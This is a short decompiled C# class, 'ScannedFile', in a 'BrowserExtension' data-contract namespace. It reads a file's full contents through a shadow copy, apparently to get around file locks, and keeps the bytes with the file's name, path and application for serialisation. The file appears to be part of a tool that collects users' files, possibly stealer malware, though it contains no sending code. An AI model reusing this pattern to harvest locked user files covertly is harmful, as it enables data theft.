using System;
using System.IO;
using System.Runtime.Serialization;

// Token: 0x0200005E RID: 94
[DataContract(Name = "ScannedFile", Namespace = "BrowserExtension")]
public class ScannedFile
{
	// Token: 0x06000212 RID: 530 RVA: 0x00003258 File Offset: 0x00001458
	public ScannedFile()
	{
	}

	// Token: 0x06000213 RID: 531 RVA: 0x0000C284 File Offset: 0x0000A484
	public ScannedFile(string filename)
	{
		this.NameOfFile = new FileInfo(filename).Name;
		using (FileCopier fileCopier = new FileCopier())
		{
			this.Body = File.ReadAllBytes(fileCopier.CreateShadowCopy(filename));
		}
	}

	// Token: 0x1700004B RID: 75
	// (get) Token: 0x06000214 RID: 532 RVA: 0x00004114 File Offset: 0x00002314
	// (set) Token: 0x06000215 RID: 533 RVA: 0x0000411C File Offset: 0x0000231C
	[DataMember(Name = "PathOfFile")]
	public string PathOfFile { get; set; }

	// Token: 0x1700004C RID: 76
	// (get) Token: 0x06000216 RID: 534 RVA: 0x00004125 File Offset: 0x00002325
	// (set) Token: 0x06000217 RID: 535 RVA: 0x0000412D File Offset: 0x0000232D
	[DataMember(Name = "NameOfFile")]
	public string NameOfFile { get; set; }

	// Token: 0x1700004D RID: 77
	// (get) Token: 0x06000218 RID: 536 RVA: 0x00004136 File Offset: 0x00002336
	// (set) Token: 0x06000219 RID: 537 RVA: 0x0000413E File Offset: 0x0000233E
	[DataMember(Name = "Body")]
	public byte[] Body { get; set; }

	// Token: 0x1700004E RID: 78
	// (get) Token: 0x0600021A RID: 538 RVA: 0x00004147 File Offset: 0x00002347
	// (set) Token: 0x0600021B RID: 539 RVA: 0x0000414F File Offset: 0x0000234F
	[DataMember(Name = "NameOfApplication")]
	public string NameOfApplication { get; set; }

	// Token: 0x1700004F RID: 79
	// (get) Token: 0x0600021C RID: 540 RVA: 0x00004158 File Offset: 0x00002358
	// (set) Token: 0x0600021D RID: 541 RVA: 0x00004160 File Offset: 0x00002360
	[DataMember(Name = "DirOfFile")]
	public string DirOfFile { get; set; }
}
